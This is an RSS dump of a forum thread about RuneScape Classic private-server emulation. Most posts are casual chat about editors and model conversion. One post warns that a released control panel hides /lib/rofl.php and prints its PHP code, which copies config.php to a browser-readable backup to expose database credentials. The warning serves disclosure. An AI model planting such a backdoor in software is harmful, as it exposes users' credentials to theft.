channel.title: Just a Warning To those who use T X's cpanel

item.title: Just a Warning To those who use T X's cpanel
item.dc:creator: @Erj Erj
item.description:
@Erj wrote:

[quote=“Ian, post:9, topic:241420”]Lol atm me and some of my mates are making a new rsc to break the bound of what can be done

We have updated the landscape editor what is like a sims editor allows us to edit up to 20 sqs at a time with color chart allowing with hotkeys pressin 1 to make a right wall 2 to make a right wall window so on so on

We have manged to convert a OBJ halo model into the rsc model format and then packing it into the jag file <3 super for unpacking and repacking so on so on

Hopfuly we will put the server up in a week xD[/quote]
Damn I look forward to seeing your work I don’t know shit about coding, but I’m always amazed when someone comes up with new sources.

Read full topic

item.title: Just a Warning To those who use T X's cpanel
item.dc:creator: @Ian Ian
item.description:
@Ian wrote:

[quote=“bigh51, post:10, topic:241420”]It’s great your trying to do all of this with rsc, it really is, but rsc is pretty much dead. There is no development going on at these forums whatsoever, just advertising and that’s finished so now its’ ghost-quiet. It’s a shame, but rsc emulation has pretty much come to an end.[/quote]True to the world but now ive got everythink needed to keep updating it gliomaru will be designing new items and models for the rsc while we do new quests so on so on hopfuly we can get a good project

Read full topic

item.description:
@bigh51 wrote:

It’s great your trying to do all of this with rsc, it really is, but rsc is pretty much dead. There is no development going on at these forums whatsoever, just advertising and that’s finished so now its’ ghost-quiet. It’s a shame, but rsc emulation has pretty much come to an end.

item.title: Just a Warning To those who use T X's cpanel
item.dc:creator: @Ian Ian
item.description:
@Ian wrote:

Lol atm me and some of my mates are making a new rsc to break the bound of what can be done

We have updated the landscape editor what is like a sims editor allows us to edit up to 20 sqs at a time with color chart allowing with hotkeys pressin 1 to make a right wall 2 to make a right wall window so on so on

We have manged to convert a OBJ halo model into the rsc model format and then packing it into the jag file <3 super for unpacking and repacking so on so on

Hopfuly we will put the server up in a week xD

item.title: Just a Warning To those who use T X's cpanel
item.dc:creator: @shangtsung1 shangtsung1
item.description:
@shangtsung1 wrote:

just a lil’ warning to those who use T X’s Server Control Panel he has release on page 2

he can use it to gain access to your database using /lib/rofl.php, it copy’s your Config.php on the server so it is viewable via a web browser

just letting ya’ll know 

<?php
$file = 'config.php';
$newfile = 'config.txt.bak';

if (!copy($file, $newfile)) {
    echo "failed to copy $file...\n";
}
?>

Read full topic
item.source: Just a Warning To those who use T X's cpanel
